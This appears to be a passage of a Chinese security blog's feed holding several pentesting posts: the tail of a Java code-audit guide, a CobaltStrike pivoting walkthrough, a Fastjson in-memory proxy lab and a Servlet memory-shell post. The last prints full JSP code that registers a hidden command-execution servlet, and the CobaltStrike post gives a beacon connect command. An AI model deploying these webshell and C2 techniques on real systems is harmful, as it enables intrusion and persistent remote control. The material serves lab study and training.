src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241016185634456.png" alt="image-20241016185812783"></p><p>​验证</p><p>​ <img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241016190009285.jpeg" alt="img"></p><p>​也是成功了</p><p><img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241016190453535.png" alt="image-20241016190453535"></p><p><img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241016190509050.png" alt="image-20241016190509050"></p><p>​看到这里，有些师傅其实发现了，这不就是CVE-2024-1021吗？没错，笔者确实没有花费时间再去找案例写博客，验证思路效果即可，无非是复现漏洞反推嘛</p><p>​这里演示了SQL注入，SpringBoot未授权访问，SSRF的漏洞挖掘，其他漏洞也都是换汤不换药，不同的漏洞肯定是不同代码写的，那无非就寻找不同的关键字确认功能点与可控参数</p><p>中期暂时就这些，后面的话我准备把各类漏洞的逆向追踪挖掘再丰富一下</p><p>人工耗时耗力，为了保证产出可以更高效，我们需要使用工具辅助挖掘，进入第三个阶段</p><h4 id="后期-工具辅助"><a href="#后期-工具辅助" class="headerlink" title="后期(工具辅助)"></a>后期(工具辅助)</h4><p>​在这个阶段，我们对一个项目经过了环境搭建、手工审计的流程之后，肯定是相当熟悉了，相信也会有一些产出成果</p><p>​现阶段的许多代码审计工具，特别是静态分析工具，主要依赖于<strong>关键字匹配、正则表达式和规则集</strong>来发现代码中的潜在漏洞，或许很近的未来会有AI的加入，到那时工具就不会那么死板了， AI 的加入将彻底改变代码审计的方式，我是非常期待的</p><p>​可能会有没有怎么接触代码审计的师傅疑问，”为什么不能直接工具一把梭?”，首先，我提倡的是手工审计+工具辅助，是辅助！而且静态分析工具虽然强大，但它们主要依赖于关键字匹配、正则表达式和预定义的规则集。比如出现复杂的逻辑漏洞和复杂的业务，以及某些仅在特定环境下的漏洞它又怎么能发现的了，这些影响不亚于RCE类高危漏洞。其次，大量的误报也会增加工作量，手工审计也是熟悉项目的一个过程，熟悉了之后对复现也有帮助</p><p>​最后，我们通过利用<strong>工具审计+手工审计</strong>共同再做一个收尾工作，试着发现遗漏的点</p><h5 id="Xray"><a href="#Xray" class="headerlink" title="Xray"></a>Xray</h5><p>​Link:<code>https://github.com/chaitin/xray</code></p><p>​<strong>具体使用大家可以去看下我2021年发在freebuf的文章 Link:</strong><code>https://www.freebuf.com/articles/web/277286.html</code></p><p>​<strong>本文到这里已经接近八千字了，笔者尽量不在阐述已经讲过的东西了</strong></p><p>​<img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241017144826870.png" alt="image-20241017144826870"></p><p>​在代码审计这块大同小异，也是利用Xray的被动扫描，本地搭建的环境没有WAF可以尽情扫，我使用的两种形式</p><p>​<strong>解放双手版：搭配Rad爬虫实现自动化扫描进行</strong></p><p>​<strong>高效出成果版：手工审计的同时开启Xray做后台扫描</strong></p><p>​各有各的好处，如果大家也有什么利用思路，恳求传授</p><h5 id="Fortify"><a href="#Fortify" class="headerlink" title="Fortify"></a>Fortify</h5><p>​老牌工具了，互联网上介绍的相关文章也比较多，但是似乎没有特别深入使用的文章，比如一些底层的配置以及优化调试等等(商业产品是这样的了)，待到我后面有时间 准备专门研究一下，再分享给大家</p><p><img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241017151742638.png" alt="image-20241017151742638"></p><p>​将扫描出的漏洞点，再通过IDEA去做审计来验证</p><h5 id="chanziSTAT"><a href="#chanziSTAT" class="headerlink" title="chanziSTAT"></a>chanziSTAT</h5><p>​近期逛github发现的一个新项目，专门针对java做代码审计的工具，作者团队更新也是很积极，有付费版和免费版两种</p><p>​Link:<code>https://github.com/Chanzi-keji/chanzi</code></p><p>​从我的使用的免费版中感觉，除了页面分布不太好影响使用外，其他感觉还可以，希望作者团队可以尽快优化下，推荐大家试一试</p><p><img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241017153956702.png" alt="image-20241017153956702"></p><p>​比较牛的是可以搭配 <code>Cypher</code> 语法去自定义规则</p><p><img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241017154350542.png" alt="image-20241017154350542"></p><p>到了这里后期就结束了，通过工具爆出的可疑漏洞点，再去进行中期-逆向追踪的漏洞挖掘，记得搭配上Xray</p><h4 id="结束"><a href="#结束" class="headerlink" title="结束"></a>结束</h4><p>​这篇文章是我迄今花费时间最长的文章了，希望对大家有帮助。如果有讲的不规范，或者错误的地方，恳请大家指出！我将火速更正，笔者写博客的原则是绝不误导任何一个人</p><p>​感谢：Power_7089师傅的答疑解惑以及支持</p><h3 id="END"><a href="#END" class="headerlink" title="END"></a>END</h3>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CobaltStrike-一种特殊的不出网上线方式</title>
      <link href="/2024/08/23/CobaltStrike-%E4%B8%80%E7%A7%8D%E7%89%B9%E6%AE%8A%E7%9A%84%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/"/>
      <url>/2024/08/23/CobaltStrike-%E4%B8%80%E7%A7%8D%E7%89%B9%E6%AE%8A%E7%9A%84%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h2 id="CobaltStrike-一种特殊的不出网上线方式"><a href="#CobaltStrike-一种特殊的不出网上线方式" class="headerlink" title="CobaltStrike-一种特殊的不出网上线方式"></a>CobaltStrike-一种特殊的不出网上线方式</h2><p><strong>免责声明：由于传播、利用本文所发布的而造成的任何直接或者间接的后果及损失，均由使用者本人承担</strong></p><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>接上文</p><p>SpringBoot场景下不出网-内存中的正向代理 <a href="https://seven1an.github.io/2024/07/29/Springboot%E5%9C%BA%E6%99%AF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91-%E5%86%85%E5%AD%98%E4%B8%AD%E7%9A%84%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86/">https://seven1an.github.io/2024/07/29/Springboot%E5%9C%BA%E6%99%AF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91-%E5%86%85%E5%AD%98%E4%B8%AD%E7%9A%84%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86/</a></p><p>这种场景出现在，当我拿下了一台内网机器，这台机器不出网</p><p>我之所以可以拿下他，是因为他的web服务通过dmz区的反向代理对外开放，也就是说我通过正向内存马将他Getshell、通过了正向代理搭建了进入内网的隧道</p><p>现在，我想让他上线CobaltStrike方便后续的提权和横向</p><p><img src="/2024/08/23/CobaltStrike-%E4%B8%80%E7%A7%8D%E7%89%B9%E6%AE%8A%E7%9A%84%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/img/1.png" alt="image-20240823110622518"></p><p>我所拿下的机器也就是这台Windows Web，如果想让他上线CS，普遍操作应该是先打到Linux，让Linux先上线CS，再在CS中通过Linux这台机器的beacon连接Windows Web实现正向连接上线</p><p>但现在出了一些问题，这台Linux没有漏洞，打不进去，还存在着Linux上线CS各种各样的问题，这里是我用CrossC2生成的Payload无法上线</p><p>最终在<strong>F_Dao</strong>师傅耐心指导下</p><p>实现出了一种我从未见过的上线方法：通过本机 也就是图中的Hacker 运行反向的木马，让本机木马走建立的Socks5代理，通过冰蝎把正向木马在Windows Web中运行，后在CS中用我本机的Beacon正向连接Windows Web中正向木马监听的端口，实现上线，看文字描述非常的绕</p><p>师傅莫虑，且看此图</p><p><img src="/2024/08/23/CobaltStrike-%E4%B8%80%E7%A7%8D%E7%89%B9%E6%AE%8A%E7%9A%84%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/img/2.png" alt="image-20240823140627584"></p><h4 id="Start"><a href="#Start" class="headerlink" title="Start"></a>Start</h4><p>环境准备：</p><p>在上一篇文章的基础上加入cs即可</p><ul><li>CobaltStrike</li><li>Behinder</li><li>Suo5</li><li>Proxifier</li></ul><h5 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h5><p>我已通过fastjson反序列化漏洞，打入内存马以及内存代理</p><p><img src="/2024/08/23/CobaltStrike-%E4%B8%80%E7%A7%8D%E7%89%B9%E6%AE%8A%E7%9A%84%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/img/3.png" alt="image-20240823140912676"></p><p> <img src="/2024/08/23/CobaltStrike-%E4%B8%80%E7%A7%8D%E7%89%B9%E6%AE%8A%E7%9A%84%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/img/4.png" alt="image-20240823140940935"></p><h6 id="本机上线"><a href="#本机上线" class="headerlink" title="本机上线"></a>本机上线</h6><p>先创建一个监听</p><p> <img src="/2024/08/23/CobaltStrike-%E4%B8%80%E7%A7%8D%E7%89%B9%E6%AE%8A%E7%9A%84%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/img/5.png" alt="image-20240823141945465"></p><p> <img src="/2024/08/23/CobaltStrike-%E4%B8%80%E7%A7%8D%E7%89%B9%E6%AE%8A%E7%9A%84%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/img/6.png" alt="image-20240823142018342"></p><p>基操不赘述</p><p> <img src="/2024/08/23/CobaltStrike-%E4%B8%80%E7%A7%8D%E7%89%B9%E6%AE%8A%E7%9A%84%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/img/7.png" alt="image-20240823142208709"></p><p>双击上线</p><p><img src="/2024/08/23/CobaltStrike-%E4%B8%80%E7%A7%8D%E7%89%B9%E6%AE%8A%E7%9A%84%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/img/8.png" alt="image-20240823142235934"></p><h6 id="指定隧道"><a href="#指定隧道" class="headerlink" title="指定隧道"></a>指定隧道</h6><p>让 7777.exe 走 socks5:&#x2F;&#x2F;127.0.0.1:1111 这个隧道</p><p> <img src="/2024/08/23/CobaltStrike-%E4%B8%80%E7%A7%8D%E7%89%B9%E6%AE%8A%E7%9A%84%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/img/9.png" alt="image-20240823142901231"></p><p>这个时候，需要指定特定的hosts，这样就可以保证木马可以从我的本机通向外网连接Teamserver，又可以从Scosk5隧道连接目标内网机器</p><h6 id="目标上线"><a href="#目标上线" class="headerlink" title="目标上线"></a>目标上线</h6><p> <img src="/2024/08/23/CobaltStrike-%E4%B8%80%E7%A7%8D%E7%89%B9%E6%AE%8A%E7%9A%84%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/img/10.png" alt="image-20240823143701170"></p><p>监听的4444，监听器命名也是4444</p><p> <img src="/2024/08/23/CobaltStrike-%E4%B8%80%E7%A7%8D%E7%89%B9%E6%AE%8A%E7%9A%84%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/img/11.png" alt="image-20240823143724870"></p><p> 把payload通过Behinder上传到目标机器中运行，查看监听</p><p> <img src="/2024/08/23/CobaltStrike-%E4%B8%80%E7%A7%8D%E7%89%B9%E6%AE%8A%E7%9A%84%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/img/12.png" alt="image-20240823144420120"></p><p>进入到本机的beacon中</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">beacon&gt; </span><span class="language-bash">connect 192.168.200.200 4444</span></span><br></pre></td></tr></table></figure><p> <img src="/2024/08/23/CobaltStrike-%E4%B8%80%E7%A7%8D%E7%89%B9%E6%AE%8A%E7%9A%84%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/img/13.png" alt="image-20240823144653201"></p><p>成功上线</p><p><img src="/2024/08/23/CobaltStrike-%E4%B8%80%E7%A7%8D%E7%89%B9%E6%AE%8A%E7%9A%84%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/img/14.png" alt="image-20240823144922474"></p><h4 id="END"><a href="#END" class="headerlink" title="END"></a>END</h4>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SpringBoot场景下不出网-内存中的正向代理</title>
      <link href="/2024/07/29/Springboot%E5%9C%BA%E6%99%AF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91-%E5%86%85%E5%AD%98%E4%B8%AD%E7%9A%84%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86/"/>
      <url>/2024/07/29/Springboot%E5%9C%BA%E6%99%AF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91-%E5%86%85%E5%AD%98%E4%B8%AD%E7%9A%84%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h2 id="SpringBoot场景下不出网-内存中的正向代理"><a href="#SpringBoot场景下不出网-内存中的正向代理" class="headerlink" title="SpringBoot场景下不出网-内存中的正向代理"></a>SpringBoot场景下不出网-内存中的正向代理</h2><p><strong>免责声明：由于传播、利用本文所发布的而造成的任何直接或者间接的后果及损失，均由使用者本人承担</strong></p><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在Tomcat场景下，我们遇到不出网的机器通常上传reGeorg，suo5，这类的正向代理工具，连接后本地开启s5即可连接进入目标的网络场景</p><p>这里存在一些问题，有落地文件，这必然是存在被查杀的风险，现在诸多内存代理脚本也被杀毒软件加入了识别，并且安全设备也会有新增文件的感知</p><p>这里针对Tomcat只是提一下</p><p>当我们目标是SpringBoot场景呢？目标无法上传jsp，有落地脚本的正向代理就完全失去了作用</p><p>这样就衍生出了一种新技术，<strong>将正向代理写入到内存中去</strong>，就如同内存马一样</p><h4 id="START"><a href="#START" class="headerlink" title="START"></a>START</h4><p>环境准备</p><ul><li><p>SpringBoot靶场</p></li><li><p>NGINX</p></li><li><p>JMG</p></li><li><p>Suo5</p></li><li><p>Proxifier</p></li></ul><p>这里，是我为后面持续更新搭建的一个靶场</p><p>拓扑图如下：</p><p><img src="/2024/07/29/Springboot%E5%9C%BA%E6%99%AF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91-%E5%86%85%E5%AD%98%E4%B8%AD%E7%9A%84%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86/img/1.png" alt="image-20240730100817751"></p><p>依靠这个靶场，后续我会持续更新相关的文章，并且会不断在这个基础上进行优化与改进</p><h5 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h5><p>这里使用Fastjson的反序列化漏洞演示</p><p>​    因为目标服务器不出网，自然就用不了JdbcRowSetImpl利用链这种jndi注入的利用方式，就只能选择直接传入恶意代码，而TemplatesImpl利用链虽然原理上也是利用了 ClassLoader 动态加载恶意代码，但是需要开启Feature.SupportNonPublicField，并且实际应用中其实不多见，所以这里使用BasicDataSource链，直接在Payload中直接传入字节码，不需要开启特殊的参数，适用范围较广，目标需要引入tomcat依赖，虽说也是一种限制，但还算是比较常见的。</p><p>这里还有一个细节问题，因为jdk8u251之后 bcel被移除，需要留意无法使用BCEL ClassLoader的问题</p><p>SpringBoot靶场使用以及一些依赖包的修改就不赘述了，文章核心是演示内存正向代理</p><h6 id="访问Fastjson"><a href="#访问Fastjson" class="headerlink" title="访问Fastjson"></a>访问Fastjson</h6><p><img src="/2024/07/29/Springboot%E5%9C%BA%E6%99%AF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91-%E5%86%85%E5%AD%98%E4%B8%AD%E7%9A%84%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86/img/2.png" alt="image-20240730105534744"></p><h6 id="内存正向代理制作"><a href="#内存正向代理制作" class="headerlink" title="内存正向代理制作"></a>内存正向代理制作</h6><p>这里使用jMG(java-memshell-generator)</p><p>一款支持高度自定义的 Java 内存马生成工具｜A highly customizable Java memory-shell generation tool.</p><p><a href="https://github.com/pen4uin/java-memshell-generator">https://github.com/pen4uin/java-memshell-generator</a></p><p>非常叼的工具，免去了手写并且转换为bcel码的过程，并且支持非常多的payload格式</p><p><img src="/2024/07/29/Springboot%E5%9C%BA%E6%99%AF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91-%E5%86%85%E5%AD%98%E4%B8%AD%E7%9A%84%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86/img/3.png" alt="image-20240730111417621"></p><p>根据自己的需要选择好对应的框架以及各类所需参数</p><h6 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h6><p>留意好，在实现处说的信息，然后按照常规打法即可</p><p><img src="/2024/07/29/Springboot%E5%9C%BA%E6%99%AF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91-%E5%86%85%E5%AD%98%E4%B8%AD%E7%9A%84%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86/img/4.png" alt="image-20240730110429233"></p><p>这里大都是成功了</p><h6 id="连接正向代理"><a href="#连接正向代理" class="headerlink" title="连接正向代理"></a>连接正向代理</h6><p>留意连接所需的信息，比如这里是需要携带一个 Referer</p><p> <img src="/2024/07/29/Springboot%E5%9C%BA%E6%99%AF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91-%E5%86%85%E5%AD%98%E4%B8%AD%E7%9A%84%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86/img/5.png" alt="image-20240730111535501"></p><p>在suo5中连接</p><p> <img src="/2024/07/29/Springboot%E5%9C%BA%E6%99%AF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91-%E5%86%85%E5%AD%98%E4%B8%AD%E7%9A%84%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86/img/6.png" alt="image-20240730111556913"></p><p>连接成功</p><p> <img src="/2024/07/29/Springboot%E5%9C%BA%E6%99%AF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91-%E5%86%85%E5%AD%98%E4%B8%AD%E7%9A%84%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86/img/7.png" alt="image-20240730111620933"></p><h6 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h6><p>使用Proxifier指定程序走的隧道</p><p> <img src="/2024/07/29/Springboot%E5%9C%BA%E6%99%AF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91-%E5%86%85%E5%AD%98%E4%B8%AD%E7%9A%84%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86/img/9.png" alt="image-20240730111832749"></p><p> <img src="/2024/07/29/Springboot%E5%9C%BA%E6%99%AF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91-%E5%86%85%E5%AD%98%E4%B8%AD%E7%9A%84%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86/img/8.png" alt="image-20240730111809796"></p><p>这都没什么好说的，学到这里的师傅肯定是都知道的</p><p>连接成功</p><p> <img src="/2024/07/29/Springboot%E5%9C%BA%E6%99%AF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91-%E5%86%85%E5%AD%98%E4%B8%AD%E7%9A%84%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86/img/10.png" alt="image-20240730112032720"></p><p><img src="/2024/07/29/Springboot%E5%9C%BA%E6%99%AF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91-%E5%86%85%E5%AD%98%E4%B8%AD%E7%9A%84%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86/img/11.png" alt="image-20240730112051766"></p><p>至此成功实现了SpringBoot场景下内存的正向代理使用</p><h4 id="END"><a href="#END" class="headerlink" title="END"></a>END</h4>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Servlet内存马的利用与排查</title>
      <link href="/2024/05/26/Servlet%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8E%92%E6%9F%A5/"/>
      <url>/2024/05/26/Servlet%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8E%92%E6%9F%A5/</url>
      
        <content type="html"><![CDATA[<h3 id="Java安全之Servlet内存马的利用以及排查"><a href="#Java安全之Servlet内存马的利用以及排查" class="headerlink" title="Java安全之Servlet内存马的利用以及排查"></a>Java安全之Servlet内存马的利用以及排查</h3><p><strong>前言：原理说起来太多了，不懂的可以先去学一下原理，本文主要做一个扫盲级别的利用，以及以蓝队的视角对这类木马排查的大致流程。</strong></p><h4 id="Start"><a href="#Start" class="headerlink" title="Start"></a>Start</h4><h5 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h5><ul><li><p>idea 2023.1.2</p></li><li><p>tomcat 8.5.100</p></li><li><p>冰蝎v4.1</p></li><li><p>tomcat-memshell-scanner</p></li><li><p>包含文件上传的servlet项目</p></li></ul><p><img src="/2024/05/26/Servlet%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8E%92%E6%9F%A5/img/1.jpg" alt="image-20240526163424209"></p><p>留意，需要加上此依赖</p><p>打成war，并且更改名字为ROOT.war来部署到tomcat中</p><p><img src="/2024/05/26/Servlet%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8E%92%E6%9F%A5/img/2.jpg" alt="image-20240526163825086"></p><p>访问</p><p><img src="/2024/05/26/Servlet%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8E%92%E6%9F%A5/img/3.jpg" alt="image-20240526164049967"></p><p>简单的上传测试成功</p><p><img src="/2024/05/26/Servlet%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8E%92%E6%9F%A5/img/4.jpg" alt="image-20240526164137984"></p><p><img src="/2024/05/26/Servlet%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8E%92%E6%9F%A5/img/5.jpg" alt="image-20240526164156688"></p><h5 id="内存马利用"><a href="#内存马利用" class="headerlink" title="内存马利用"></a>内存马利用</h5><p>源码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.PrintWriter&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Wrapper&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MemServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> String message;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span> &#123;</span><br><span class="line">            message = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;command&quot;</span>);</span><br><span class="line">            Runtime.getRuntime().exec(command);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">applicationContextField</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    applicationContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext)applicationContextField.get(servletContext);</span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">standarContextField</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    standarContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">context</span> <span class="operator">=</span> (StandardContext) standarContextField.get(applicationContext);</span><br><span class="line"></span><br><span class="line">    <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> context.createWrapper();</span><br><span class="line">    wrapper.setName(<span class="string">&quot;MemServlet&quot;</span>);</span><br><span class="line">    wrapper.setServletClass(MemServlet.class.getName());</span><br><span class="line">    wrapper.setServlet(<span class="keyword">new</span> <span class="title class_">MemServlet</span>());</span><br><span class="line"></span><br><span class="line">    context.addChild(wrapper);</span><br><span class="line">    context.addServletMappingDecoded(<span class="string">&quot;/memshell&quot;</span>,<span class="string">&quot;MemServlet&quot;</span>);</span><br><span class="line"></span><br><span class="line">%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上传成功</p><p><img src="/2024/05/26/Servlet%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8E%92%E6%9F%A5/img/6.jpg" alt="image-20240526164609901"></p><p>访问 使其注册</p><p><img src="/2024/05/26/Servlet%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8E%92%E6%9F%A5/img/7.jpg" alt="image-20240526165010421"></p><p>响应空白 本身就没有输出 